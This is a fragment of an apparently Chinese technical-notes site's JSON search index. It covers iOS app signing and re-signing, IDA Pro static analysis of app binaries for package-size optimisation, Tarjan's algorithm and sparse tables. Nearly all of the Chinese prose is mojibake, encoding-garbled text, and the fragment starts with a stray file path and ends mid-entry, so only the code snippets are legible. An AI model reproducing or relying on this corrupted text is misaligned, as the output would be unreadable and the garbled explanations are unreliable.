Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps  App ç­¾å #  ç­¾ååŸç† #  App ç­¾åæ˜¯ä¸€ä¸ªåŸºäº CA çš„è®¤è¯æ¶æ„ï¼ŒCA æŒ‡ Certificate Authorityï¼Œå¯¹äº CA æœºæ„çš„ä¿¡ä»»æ˜¯ä¸€åˆ‡ç°ä»£ä¿¡æ¯å®‰å…¨äº’ä¿¡ä½“ç³»çš„åŸºçŸ³ã€‚\nCA çš„è®¤è¯æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\nä¸Šé¢çš„æµç¨‹å¤§è‡´çš„é˜è¿°äº†å¦‚ä½•å®ç°ä¸€ä¸ªç”¨æˆ·ï¼Œå¦‚ä½•å®ç°å¯¹ä¸€ä¸ªæœªçŸ¥èº«ä»½çš„å¼€å‘è€…çš„ä¿¡ä»»é—®é¢˜ã€‚\nå¯¹äºè¿™ä¸€ä½“ç³»åœ¨ App ä¿¡ä»»ä¸­çš„åº”ç”¨ï¼Œåˆ™å¯ä»¥ç”¨ä¸‹é¢çš„æµç¨‹é˜è¿°ï¼š\nå…·ä½“åœ¨ iOS ä¸­ï¼ŒApp ç­¾åè¿™ä¸ªè¿‡ç¨‹ä¸­æœ‰ä»¥ä¸‹å…³é”®çš„å‡ ä¸ªæ–‡ä»¶ï¼š\n CertificateSigningRequest.certSigningRequestï¼šå¯¹åº”ä¸Šå›¾ä¸­çš„ Dev-PublicKey çš„æ‰“åŒ…æ–‡ä»¶ï¼› iOS_development.cerï¼›å¯¹åº”ä¸Šå›¾ä¸€ä¸­ç»¿è‰²çš„ certificate æ–‡ä»¶ï¼› Entitlements æˆæƒæ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯ plist åç¼€ï¼šåœ¨ä¸Šå›¾äºŒä¸­ï¼Œå¯¹ App çš„å“ˆå¸Œè¿‡ç¨‹ä¸­ï¼Œä¹Ÿä¼šåŠ å…¥ App çš„æˆæƒä¿¡æ¯ï¼›  é‡ç­¾å #  ä¸€æ—¦æ”¹å˜äº† App çš„äºŒè¿›åˆ¶å†…å®¹æˆ–ä»»ä½•æˆæƒå†…å®¹ï¼Œä¸Šé¢çš„æˆæƒä¿¡æ¯ distribution certificate å°±ä¼šè¢«ç ´åã€‚App ä¿¡æ¯å®Œæ•´æ€§éªŒè¯è¿™ä¸€è¿‡ç¨‹å°±ä¼šå¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬å°±éœ€è¦å¯¹ App è¿›è¡Œé‡ç­¾åã€‚\né‡ç­¾åçš„æ­¥éª¤å¤§è‡´å¦‚ä¸‹ï¼š\n  é€šè¿‡å‘½ä»¤è·å–æœ¬æœºä¸Šçš„è¯ä¹¦åˆ—è¡¨ï¼š\n$ security find-identity -p codesigning -v   ç”Ÿæˆ entitlements.plistï¼š\n  å¤åˆ¶ mobileprovision æ–‡ä»¶åˆ° .app ç›®å½•ä¸‹ï¼›\n  æ‰‹åŠ¨ç­¾åï¼›\n  å°† .app æ‰“åŒ…æˆ .ipaï¼›\n  "},{"id":195,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ios%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/","title":"2.é™æ€åˆ†æ","section":"iOSé€†å‘åˆ†æ","content":"é™æ€åˆ†æ #  iOS çš„é™æ€åˆ†æå·¥å…·ä¸»è¦æœ‰ Hopper/IDA Proã€‚\nHopper #  IDA Pro #  ä¸‹é¢æ˜¯ä¸€äº› IDA Pro çš„å¸¸ç”¨åŠŸèƒ½ä¸å¿«æ·é”®ï¼š\n å­—ç¬¦ä¸²æœç´¢ï¼šAlt+T (Windows)ï¼›Option+T (Mac OS)ï¼› è·³è½¬åœ°å€ï¼šåœ¨ IDA ä¸­æŒ‰ \u0026ldquo;G\u0026rdquo;ï¼Œè¾“å…¥æŒ‡å®šçš„è·³è½¬åœ°å€å³å¯è·³è½¬ï¼› ç¼–å†™æ³¨é‡Šï¼š  å¯é‡å¤æ³¨é‡Šï¼šæŒ‰ \u0026ldquo;;\u0026rdquo; åˆ†å·ï¼Œå¯ä»¥æ·»åŠ å¯é‡å¤æ³¨é‡Šï¼Œè¿™ç§æ³¨é‡Šä¼šåŒæ—¶å‡ºç°åœ¨å…¶äº¤å‰å¼•ç”¨çš„åœ°æ–¹ï¼› éé‡å¤æ³¨é‡Šï¼šæŒ‰ \u0026ldquo;:\u0026rdquo; å†’å·ï¼Œå¯æ·»åŠ é‡å¤æ³¨é‡Šï¼Œä¼˜å…ˆçº§å¤§äºå‰è€…ï¼Œä¸è¿‡ä¸ä¼šå‡ºç°åœ¨äº¤å‰å¼•ç”¨çš„ä½ç½®ï¼› ä¼ªä»£ç æ³¨é‡Šï¼šç›´æ¥æŒ‰ \u0026ldquo;/\u0026rdquo; åˆ†å·ï¼Œå¯ä»¥ä¸ºä¼ªä»£ç æ·»åŠ æ³¨é‡Šï¼›   å˜é‡é‡å‘½åï¼šå•å‡»ç›®æ ‡å˜é‡ï¼ŒæŒ‰ \u0026ldquo;N\u0026rdquo; è¿›è¡Œé‡å‘½åï¼› æŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼šé€‰ä¸­å‡½æ•°/å˜é‡ï¼ŒæŒ‰ \u0026ldquo;X\u0026rdquo; å¯ä»¥æŸ¥çœ‹å½“å‰ä½ç½®è¢«å“ªäº›åœ°æ–¹å¼•ç”¨äº†ï¼› è¿›åˆ¶è½¬æ¢ï¼šä¼ªä»£ç å±•ç¤ºçš„æ•°å­—é»˜è®¤è¿›åˆ¶æ˜¯åè¿›åˆ¶ï¼Œå¯ä»¥æŒ‰ \u0026ldquo;H\u0026rdquo; è¿›è¡Œè¿›åˆ¶è½¬æ¢ï¼› ç±»å‹å£°æ˜ï¼šå˜é‡ç±»å‹/æ–¹æ³•å‚æ•°ç­¾åç­‰ï¼Œå¦‚æœ IDA é»˜è®¤è¯†åˆ«æœ‰é—®é¢˜ï¼Œå¯ä»¥æŒ‰ \u0026ldquo;Y\u0026rdquo; è¿›è¡Œé‡å£°æ˜ï¼› æ ¼å¼è½¬åŒ–ï¼š  åœ¨è¢«è§£æä¸ºæ•°æ®çš„ä½ç½®æŒ‰ \u0026ldquo;C\u0026rdquo; å¯ä»¥è§£æä¸ºä»£ç ï¼Œåä¹‹æŒ‰ \u0026ldquo;D\u0026rdquo;ï¼› å¯¹äºä¸€è¿ä¸²çš„ ASCII å­—ç¬¦ï¼ŒæŒ‰ \u0026ldquo;A\u0026rdquo; å¯ä»¥å°†ä¸€è¿ä¸²åœ°å€çš„å­—ç¬¦è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼› æŒ‰ \u0026ldquo;U\u0026rdquo; å¯ä»¥å–æ¶ˆå¯¹æ•°æ®æ®µçš„è§£æï¼›    é™æ€åˆ†æå®è·µ #  äº§ç‰©åˆ†æ #  æˆ‘ä»¬ä½¿ç”¨ XCode é»˜è®¤å»ºç«‹çš„å·¥ç¨‹ï¼Œåœ¨ viewDidLoad é‡Œé¢ç¼–å†™äº†ä¸€æ®µä»£ç ï¼Œçœ‹çœ‹è¿™å†™ä»£ç æ˜¯å¦‚ä½•å®ç°çš„ï¼š\n#define SCREEN_WIDTH [UIScreen mainScreen].bounds.size.width #define SCREEN_HEIGHT [UIScreen mainScreen].bounds.size.height #define TEXT_WIDTH 100 #define TEXT_HEIGHT 100  @implementation ViewController  - (void)viewDidLoad {  CGPoint origin = CGPointMake((SCREEN_WIDTH - TEXT_WIDTH) / 2, (SCREEN_HEIGHT - TEXT_HEIGHT) / 2);  UITextView *customTextView = [[UITextView alloc] initWithFrame:CGRectMake(origin.x,  origin.y,  TEXT_WIDTH,  TEXT_HEIGHT)];  customTextView.text = @\u0026#34;Westworld.\u0026#34;;  customTextView.scrollEnabled = YES;  customTextView.editable = NO;  [self.view addSubview:customTextView]; }  @end åœ¨ Product æ–‡ä»¶å¤¹ä¸­ï¼Œæ‰¾åˆ° .app åç¼€çš„äº§ç‰©æ–‡ä»¶å¤¹ï¼Œæ”¾å…¥ IDAã€‚åœ¨å·¦ä¾§çª—å£æ³¨æ„åˆ°è¿™ä¸ªæ–¹æ³•ï¼š- [ViewController viewDidLoad]ï¼š\nvoid __cdecl -[ViewController viewDidLoad](ViewController *self, SEL a2) {  void *v2; // rax  void *v3; // r15  void *v4; // rax  void *v5; // rbx   v2 = (void *)objc_alloc((__int64)\u0026amp;OBJC_CLASS___UITextView, (__int64)a2);  v3 = objc_msgSend(v2, \u0026#34;initWithFrame:\u0026#34;, xmmword_100002460, xmmword_100002470);  objc_msgSend(v3, \u0026#34;setText:\u0026#34;, CFSTR(\u0026#34;Westworld.\u0026#34;), xmmword_100002460, xmmword_100002470);  v4 = objc_msgSend(self, \u0026#34;view\u0026#34;);  v5 = (void *)objc_retainAutoreleasedReturnValue((__int64)v4);  objc_msgSend(v5, \u0026#34;addSubview:\u0026#34;, v3);  objc_release(v5);  objc_release(v3); } ä¸Šé¢çš„ä¼ªä»£ç ç»“æœå¯ä»¥è®©æˆ‘ä»¬å¯¹ OC çš„å±€éƒ¨å˜é‡çš„å·¥ä½œæœºåˆ¶æœ‰ä¸€å®šçš„äº†è§£ï¼Œæœ‰å…³ objc_alloc / objc_msgSend ç­‰å‡½æ•°çš„å®ç°ï¼Œæˆ‘ä»¬ä½¿ç”¨ç°åœ¨çš„ .app äº§ç‰©æ–‡ä»¶åŒ…ï¼Œæš‚æ—¶æ˜¯çœ‹ä¸åˆ°çš„ã€‚\nåŒ…å¤§å°ä¼˜åŒ–æ¡ˆä¾‹ \u0026ndash; Block ä¼˜åŒ– #  ä¸€ä¸ªç»å…¸çš„åŒ…å¤§å°ä¼˜åŒ–æ–¹å¼æ˜¯ Block ä¼˜åŒ–ï¼Œä¸ºä»€ä¹ˆå¯¹ Block çš„ä¼˜åŒ–å¯ä»¥ä¼˜åŒ–åŒ…å¤§å°å‘¢ï¼Ÿ\næˆ‘ç¼–å†™äº†ä¸‹é¢ä¸€ä¸ªæµ‹è¯•ç¨‹åºï¼š\n- (void)normalSet {  [self.testWithMap setMapMsgWithBlock:^(NSMutableDictionary * _Nonnull map) {  map[@\u0026#34;hello1\u0026#34;] = @\u0026#34;hello1\u0026#34;;  map[@\u0026#34;hello2\u0026#34;] = @\u0026#34;hello2\u0026#34;;  map[@\u0026#34;hello3\u0026#34;] = @\u0026#34;hello3\u0026#34;;  map[@\u0026#34;hello4\u0026#34;] = @\u0026#34;hello4\u0026#34;;  }]; }  - (void)optimizeSet {  NSMutableDictionary *map = self.testWithMap.testMap;  map[@\u0026#34;hello1\u0026#34;] = @\u0026#34;hello1\u0026#34;;  map[@\u0026#34;hello2\u0026#34;] = @\u0026#34;hello2\u0026#34;;  map[@\u0026#34;hello3\u0026#34;] = @\u0026#34;hello3\u0026#34;;  map[@\u0026#34;hello4\u0026#34;] = @\u0026#34;hello4\u0026#34;; } åœ¨ IDA Pro ä¸­åˆ†æåå¯ä»¥å¾—åˆ°ä½¿ç”¨ä¸¤ç§æ–¹æ³•å¯¹å†…å­˜çš„å¢é‡æ”¹å˜ï¼š\né™¤æ­¤ä¹‹å¤–ï¼Œå‰è€…è¿˜åœ¨æ•°æ®ç«¯ä¿å­˜äº†ä¸€ä»½ block çš„ç»“æ„ä½“ï¼š\nstruct __block_impl {  void *isa;  int Flags;  int Reserved;  void *FuncPtr; }; ç”¨æ›´ç›´è§‚çš„å›¾è¡¨ç¤ºï¼š\nè¿™ä¹Ÿå°±æ˜¯è¯´ï¼š\n normalSet æ–¹æ³•å ç”¨å­—èŠ‚å¤§å°ï¼š0x60 + 0xC8 + 0x18 = 0x140 optimizeSet æ–¹æ³•å ç”¨çš„å­—èŠ‚å¤§å°ï¼š0xF8 äºŒè€…å ç”¨å†…å­˜çš„å·®å€¼æ˜¯ï¼š0x140 - 0xF8 = 0x48  åŒ…å¤§å°ä¼˜åŒ–æ¡ˆä¾‹ \u0026ndash; ç±»æ–¹æ³•è½¬ C æ–¹æ³• #  åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿæ¥ç ”ç©¶ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆç±»æ–¹æ³•è½¬ C æ–¹æ³•ä¼šå¯ä»¥å¯¹å†…å­˜è¿›è¡Œä¼˜åŒ–ã€‚\næµ‹è¯•ç¨‹åºï¼š\nvoid iteratorC(void) {  for (int i = 0; i \u0026lt; 100; i++) {  NSLog(@\u0026#34;%d\\n\u0026#34;, i);  } }  @implementation TestClass  + (void)iteratorClass {  for (int i = 0; i \u0026lt; 100; i++) {  NSLog(@\u0026#34;%d\\n\u0026#34;, i);  } }  @end åœ¨ IDA Pro ä¸­ï¼Œå¯ä»¥åˆ†æè¿™ä¸¤è€…ä¹‹é—´çš„å‡½æ•°äºŒè¿›åˆ¶ä¸»ä½“çš„å¤§å°ï¼š\nå¯ä»¥çœ‹å‡ºå®ƒä»¬çš„å‡½æ•°ä¸»ä½“å¤§çº¦æœ‰ 0x8 ä¸ªå­—èŠ‚çš„å·®å¼‚ï¼Œè¿™å¹¶ä¸æ˜¯å¾ˆå¤§çš„å·®å¼‚ï¼Œæˆ‘ä»¬çœ‹çœ‹ä»–ä»¬çš„æ±‡ç¼–ä»£ç å¯ä»¥çœ‹å‡ºè¿™ä¸ªå·®å¼‚åœ¨å“ªé‡Œï¼š\nmov [rbp+var_8], rdi mov [rbp+var_10], rsi è¿™æ˜¯åè€…ç›¸å¯¹äºå‰è€…å¤šå‡ºçš„ä¸¤è¡Œæ±‡ç¼–ä»£ç ï¼Œæ°å¥½ 8 ä¸ªå­—èŠ‚ï¼š\n åè€…æ˜¯ OC çš„æ–¹æ³•ï¼Œé»˜è®¤å¸¦æœ‰ TestClass_meta *self, SEL a2 ä¸¤ä¸ªå‚æ•°ï¼› ä¸Šé¢çš„ä¸¤è¡Œæ±‡ç¼–ä»£ç æ˜¯æŠŠè¿™ä¸¤ä¸ªå‚æ•°å¤åˆ¶å¯„å­˜å™¨ä¸­çš„ä»£ç ï¼› è¿™ä¸¤è¡Œä»£ç åœ¨å‡½æ•°ä¸»ä½“ä¸­æ²¡æœ‰ä½¿ç”¨åˆ°ï¼Œæ˜¯æ²¡æœ‰æ„ä¹‰çš„ç¼–è¯‘å™¨äº§ç”Ÿçš„å†—ä½™ä»£ç ï¼Œå¾ˆæœ‰å¯èƒ½åœ¨å¼€å¯äº†ç¼–è¯‘é€‰é¡¹åè¢«ä¼˜åŒ–ï¼›  é‚£ä¹ˆæ˜¯å¦æœ‰æ›´æœ‰æ„ä¹‰çš„ä¼˜åŒ–å‘¢ï¼Ÿæˆ‘ä»¬å†ç¼–å†™ä¸€æ®µè°ƒç”¨æ–¹çš„ä»£ç ï¼š\n- (void)callC {  iteratorC(); }  - (void)callClass {  [TestClass iteratorClass]; } åœ¨ IDA Pro ä¸­ï¼Œåˆ†æè¿™äºŒè€…çš„äºŒè¿›åˆ¶å‡½æ•°ä¸»ä½“å¤§å°ï¼š\nå®ƒä»¬çš„å‡½æ•°ä¸»ä½“å¤§çº¦æœ‰ 0x12 ä¸ªå­—èŠ‚çš„å·®å¼‚ï¼ŒåŒæ ·çš„æˆ‘ä»¬å¯ä»¥åœ¨æ±‡ç¼–ä¸­çœ‹å‡ºè¿™ä¸€å·®å¼‚æ¥è‡ªäºï¼š\n# callClass ä¼ é€’å‚æ•°çš„ä»£ç è´¡çŒ®äº† 0x11 ä¸ªå­—èŠ‚çš„ä»£ç å¢é‡ã€‚ mov rax, cs:classRef_TestClass mov rsi, cs:selRef_iteratorClass ; char * mov rdi, rax ; void * # ä¸¤è€…è°ƒç”¨æ–¹æ¡ˆæœ¬èº«çš„æ±‡ç¼–ä»£ç ä¹Ÿæœ‰ä¸€ä¸ªå­—èŠ‚çš„å·®å¼‚ call _iteratorC # 5 Bytes call cs:_objc_msgSend_ptr ; +[TestClass iteratorClass] # 6 Bytes æ€»ç»“èµ·æ¥ï¼Œåè€…ä¸å‰è€…çš„å·®å¼‚ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„å›¾è¡¨ç¤ºï¼š\nåœ¨è¿™ä¸ªå…·ä½“çš„ä¾‹å­ä¸­ï¼Œé€šè¿‡è¿™ä¸ªæ–¹å¼ä¼˜åŒ–çš„å†…å­˜ä¸ºï¼š\n callee æ–¹ä¼˜åŒ–ï¼š0x8ï¼› caller æ–¹ä¼˜åŒ–ï¼š0x12 + 0x8 + 0xD = 0x2Dï¼›  è¿™ç§ä¼˜åŒ–æ–¹å¼æ˜¾ç„¶æ²¡æœ‰å‰è€…é«˜æ•ˆï¼›\n"},{"id":196,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E5%9B%BE%E8%AE%BA/tarjan/","title":"Tarjan","section":"å›¾è®º","content":"å›¾è®º #  Tarjan #  å®ç° #  Tarjan\u0026rsquo;s algorithm æ˜¯ä¸€ä¸ªç”¨äºæ±‚è§£æ— å‘å›¾å‰²ç‚¹ä¸æ¡¥çš„ç®—æ³•ã€‚ç›´æ¥ä¸Šä»£ç ï¼š\nvoid tarjan(int u, int v) {  /* compute dfn and low while performing a dfs search - beginning at vertex u, v is the parent of u (if any) */ \tnodePointer ptr; \tint w; \tdfn[u] = low[u] = num++; \tfor (ptr = graph[u]; ptr; ptr = ptr-\u0026gt;link) { \tw = ptr-\u0026gt;vertex;  if (dfn[w] \u0026lt; 0) { /* w is an unvisited vertex */ \ttarjan(w,u); \tlow[u] = min(low[u],low[w]);  } else if (w != v) { \tlow[u] = min(low[u],dfn[w])  }  } } æ¦‚å¿µ #  ä¸‹é¢å…ˆçœ‹ä¸€äº›æ¦‚å¿µï¼š\nå‰²ç‚¹ï¼š\n è‹¥ä»å›¾ä¸­åˆ é™¤èŠ‚ç‚¹ x ä»¥åŠæ‰€æœ‰ä¸ x å…³è”çš„è¾¹ä¹‹åï¼Œå›¾å°†è¢«åˆ†æˆä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„ä¸ç›¸è¿çš„å­å›¾ï¼Œé‚£ä¹ˆç§° x ä¸ºå›¾çš„å‰²ç‚¹ã€‚  æ¡¥ï¼š\n è‹¥ä»å›¾ä¸­åˆ é™¤è¾¹ e ä¹‹åï¼Œå›¾å°†åˆ†è£‚æˆä¸¤ä¸ªä¸ç›¸è¿çš„å­å›¾ï¼Œé‚£ä¹ˆç§° e ä¸ºå›¾çš„æ¡¥æˆ–å‰²è¾¹ã€‚  æœç´¢æ ‘ï¼š\n åœ¨æ— å‘å›¾ä¸­ï¼Œæˆ‘ä»¬ä»¥æŸä¸€ä¸ªèŠ‚ç‚¹ x å‡ºå‘è¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œæ‰€æœ‰è¢«è®¿é—®è¿‡çš„èŠ‚ç‚¹ä¸è¾¹æ„æˆä¸€æ£µæ ‘ï¼Œæˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸ºâ€œæ— å‘è¿é€šå›¾çš„æœç´¢æ ‘â€ã€‚  å¼ºè¿é€šå›¾ï¼ˆStrongly Connected Graphï¼‰ï¼š\n å¦‚æœä¸€ä¸ªæœ‰å‘å›¾ä¸­ï¼Œå¯¹äºä»»æ„ä¸¤ç‚¹xã€yï¼Œå‡å­˜åœ¨ x åˆ° y å’Œ y åˆ° x çš„è·¯å¾„ï¼Œåˆ™ç§°è¿™ä¸ªå›¾ä¸ºå¼ºè¿é€šå›¾ã€‚  å¼ºè¿é€šåˆ†é‡ï¼š\n å¯¹äºä¸€ä¸ªæ™®é€šçš„æœ‰å‘å›¾ï¼Œå®ƒçš„æœ€å¤§å¼ºè¿é€šå­å›¾ä¸ºå…¶å¼ºè”é€šåˆ†é‡ã€‚  è¿½æº¯å€¼ï¼š\n è¿½æº¯å€¼æ˜¯ä¸€ä¸ªä¸ºäº†æ±‚è§£å¼ºè¿é€šå›¾è€Œæå‡ºçš„æ¦‚å¿µï¼Œå›¾ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½è¢«èµ‹äºˆäº†ä¸€ä¸ªâ€œè¿½æº¯å€¼â€ï¼ˆä»£ç ä¸­ç”¨ low[] è¡¨ç¤ºï¼‰ï¼Œç›¸åŒâ€œè¿½æº¯å€¼â€èŠ‚ç‚¹æ„æˆçš„å­å›¾å°±æ˜¯å¼ºè¿é€šå›¾ï¼› å…¬å¼åŒ–è¡¨ç¤ºï¼š$low (u) = \\min{ dfn(u), min {low (w)| \\text{where w is a child of u}}, min { dfn(w)| \\text{(u, w) is a back edge} } }$ æ¯ä¸ªèŠ‚ç‚¹çš„è¿½æº¯å€¼é€šè¿‡ä»¥ä¸‹æ€æƒ³æ±‚è§£ï¼š  æ„å»ºåŸå›¾çš„æœç´¢æ ‘ï¼Œè®°å½•æ¯ä¸ªç‚¹è¢«è®¿é—®çš„æ¬¡åºï¼Œç”¨ dfn[] è¡¨ç¤ºï¼ˆdepth first numberï¼šæ·±åº¦åºï¼‰ï¼› éå†å›¾ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ xï¼Œä» x å‡ºå‘å¯ä»¥åˆ°è¾¾çš„æ‰€æœ‰èŠ‚ç‚¹ä¸­ï¼Œdfn[] æœ€å°çš„å³ä¸º x çš„è¿½æº¯å€¼ï¼Œç”¨ low[] è¡¨ç¤ºï¼›    åŒè”é€šï¼ˆBi-Connection Componentï¼‰ï¼š\n è¾¹åŒè”é€šæ€§ï¼šå¯¹äºè”é€šæ— å‘å›¾ä¸­çš„ä¸¤ä¸ªç‚¹ u/vï¼Œåˆ é™¤å›¾ä¸­ä»»æ„ä¸€æ¡è¾¹ï¼Œu/v é—´éƒ½å­˜åœ¨è·¯å¾„ï¼Œé‚£ä¹ˆç§°å®ƒä»¬æ˜¯è¾¹åŒè”é€šçš„ï¼› ç‚¹åŒè”é€šæ€§ï¼šå¯¹äºè”é€šæ— å‘å›¾ä¸­çš„ä¸¤ä¸ªç‚¹ u/vï¼Œåˆ é™¤å›¾ä¸­ä»»æ„ä¸€ä¸ªç‚¹ï¼Œu/v é—´éƒ½å­˜åœ¨è·¯å¾„ï¼Œé‚£ä¹ˆç§°å®ƒä»¬æ˜¯ç‚¹åŒè”é€šçš„ï¼› è¾¹åŒè”é€šå›¾ï¼ˆe-bccï¼‰ï¼šå»æ‰ä»»ä½•ä¸€æ¡è¾¹éƒ½ä¸ä¼šæ”¹å˜å›¾çš„è”é€šæ€§ $\\Leftrightarrow$ å›¾ä¸­ä¸å­˜åœ¨â€œæ¡¥â€ $\\Leftrightarrow$ å›¾ä¸­ä»»æ„ä¸¤ä¸ªç‚¹éƒ½æ˜¯è¾¹åŒè”é€šçš„ï¼› ç‚¹åŒè”é€šå›¾ï¼ˆv-bccï¼‰ï¼šå»æ‰ä»»ä½•ä¸€ä¸ªç‚¹éƒ½ä¸ä¼šæ”¹å˜å›¾çš„è”é€šæ€§ $\\Leftrightarrow$ å›¾ä¸­ä¸å­˜åœ¨â€œå‰²ç‚¹â€ $\\Leftrightarrow$ å›¾ä¸­ä»»æ„ä¸¤ä¸ªç‚¹éƒ½æ˜¯ç‚¹åŒè”é€šçš„ï¼›  Tarjan ä¸­å‰²ç‚¹å’Œæ¡¥çš„åˆ¤æ–­æ¡ä»¶ #  æ¡¥ï¼š\n å¯¹äºä¸€ä¸ªæœç´¢æ ‘æ ‘å¹²ï¼ˆå¯ä»¥è¯æ˜éæœç´¢æ ‘è¾¹ä¸€å®šä¸æ˜¯æ¡¥ï¼‰parent -\u0026gt; childï¼Œå¦‚æœæ»¡è¶³ low[child] \u0026gt; dfs[parent]ï¼Œåˆ™è¯¥è¾¹æ˜¯ä¸€ä¸ªæ¡¥ï¼› å³å­èŠ‚ç‚¹æ— æ³•é€šè¿‡éæœç´¢æ ‘çš„æ–¹å¼å›åˆ°æœç´¢æ ‘ä¸­ä½ç½®æ›´é«˜çš„èŠ‚ç‚¹ï¼›  å‰²ç‚¹ï¼š\n å¯¹äºæ ¹èŠ‚ç‚¹ï¼Œå­æ ‘æ•°é‡å¤§äº 1ï¼Œåˆ™è¯¥èŠ‚ç‚¹æ˜¯ä¸€ä¸ªå‰²ç‚¹ï¼› å¯¹äºä¸€ä¸ªéæ ¹èŠ‚ç‚¹ parentï¼Œå¦‚æœå­˜åœ¨ä»»æ„ä¸€æ¡è¾¹è¾¾åˆ°çš„èŠ‚ç‚¹ childï¼Œå¦‚æœæ»¡è¶³ low[child] \u0026gt;= dfn[parent]ï¼Œåˆ™è¯¥ç‚¹ parent æ˜¯ä¸€ä¸ªå‰²ç‚¹ï¼› å³å­˜åœ¨ä¸€ä¸ªå­èŠ‚ç‚¹ child è¦åˆ°è¾¾æ ¹èŠ‚ç‚¹ï¼Œå¿…é¡»é€šè¿‡ parentã€‚  Tarjan çš„ç»“æœä¸æ˜¯å¹¶æŸ¥é›† #  ä¸€ä¸ªçœ‹ä¼¼åˆç†çš„ç»“è®ºæ˜¯ï¼š\n Tarjan çš„ low æ•°ç»„å­˜å‚¨çš„æ˜¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹èƒ½å¤Ÿé€šè¿‡é dfs è·¯å¾„æ‰¾åˆ°çš„æœ€é«˜æœç´¢æ ‘çˆ¶èŠ‚ç‚¹ã€‚åœ¨å¹¶æŸ¥é›†çš„æ¦‚å¿µä¸­ï¼Œå®ƒç”¨æœ€é«˜æœç´¢æ ‘çˆ¶èŠ‚ç‚¹çš„éå†åº dfn æ¥ä½œä¸ºâ€œä»£è¡¨å…ƒâ€è¡¨ç¤ºæ‰€æœ‰èŠ‚ç‚¹ã€‚ åœ¨è¿™ä¸ªç†è§£ä¸‹ï¼š  æ¡¥çš„è®¡ç®—æ–¹å¼å³åˆ¤æ–­ï¼šæ¯æ¡å…³è”çš„ä¸¤ä¸ªèŠ‚ç‚¹çš„ä»£è¡¨å…ƒï¼ˆlowï¼‰æ˜¯å¦ç›¸ç­‰ï¼› æ‰€æœ‰ä»£è¡¨å…ƒï¼ˆlowï¼‰ç›¸ç­‰çš„ç‚¹æ„æˆçš„é›†åˆå³ä¸ºä¸€ä¸ªåŒè”é€šåˆ†é‡ã€‚    è¿™ä¸ªç»“è®ºåœ¨ low çš„ç†å¿µå‰æä¸‹æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯åœ¨ dfs å®ç°çš„ä»£ç ä¸­æ˜¯é”™è¯¯çš„ã€‚çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š\nå·¦è¾¹çš„å›¾æŒ‰ç…§ç»™å®šçš„è¾¹åºä¼šç”Ÿæˆå³è¾¹çš„å›¾ï¼Œåœ¨éå†åˆ° F/E æ—¶è™½ç„¶èƒ½å¤Ÿå›åˆ°ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ˜¯å®ƒä»¬é€šè¿‡éå›æº¯è·¯å¾„èƒ½å¤Ÿåˆ°è¾¾æœ€é«˜çš„èŠ‚ç‚¹ï¼Œæ‰€ä»¥ low æ•°ç»„çš„æœ€ç»ˆç»“æœä¼šæ˜¯ï¼š\n[0, 0, 0, 0, 1, 1] "},{"id":197,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/oi-wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/st%E8%A1%A8/","title":"Stè¡¨","section":"æ•°æ®ç»“æ„","content":"ST(Sparse Table) #  å¯é‡å¤è´¡çŒ®é—®é¢˜ #  å¯¹äºè¿ç®— $$opt$$ï¼Œå¦‚æœå®ƒæ»¡è¶³ $$x\\ opt\\ x = x$$ï¼Œåˆ™å¯¹åº”çš„åŒºé—´è¯¢é—®å°±æ˜¯ä¸€ä¸ªå¯é‡å¤è´¡çŒ®é—®é¢˜ã€‚\nä¾‹å¦‚:\n è¿ç®— max æœ‰ $$max(x, x) = x$$ï¼Œè¿ç®— gcd æœ‰ $$gcd(x, x) = x$$ æ‰€ä»¥ RMQ å’ŒåŒºé—´ GCD å°±æ˜¯ä¸€ä¸ªå¯é‡å¤è´¡çŒ®é—®é¢˜ã€‚åƒåŒºé—´å’Œå°±ä¸å…·æœ‰è¿™ä¸ªæ€§è´¨ï¼Œå¦‚æœæ±‚åŒºé—´å’Œçš„æ—¶å€™é‡‡ç”¨çš„é¢„å¤„ç†åŒºé—´é‡å äº†ï¼Œåˆ™ä¼šå¯¼è‡´é‡å éƒ¨åˆ†è¢«è®¡ç®—ä¸¤æ¬¡ï¼Œè¿™æ˜¯æˆ‘ä»¬æ‰€ä¸æ„¿æ„çœ‹åˆ°çš„ã€‚å¦å¤–ï¼Œ è¿˜å¿…é¡»æ»¡è¶³ç»“åˆå¾‹æ‰èƒ½ä½¿ç”¨ ST è¡¨æ±‚è§£ã€‚  æ›´å…·ä½“çš„ï¼š\n  é¢˜ç›®å¤§æ„ï¼šç»™å®š ä¸ªæ•°ï¼Œæœ‰ ä¸ªè¯¢é—®ï¼Œå¯¹äºæ¯ä¸ªè¯¢é—®ï¼Œä½ éœ€è¦å›ç­”åŒºé—´ ä¸­çš„æœ€å¤§å€¼ã€‚\nè€ƒè™‘æš´åŠ›åšæ³•ã€‚æ¯æ¬¡éƒ½å¯¹åŒºé—´ æ‰«æä¸€éï¼Œæ±‚å‡ºæœ€å¤§å€¼ã€‚\næ˜¾ç„¶ï¼Œè¿™ä¸ªç®—æ³•ä¼šè¶…æ—¶ã€‚\n  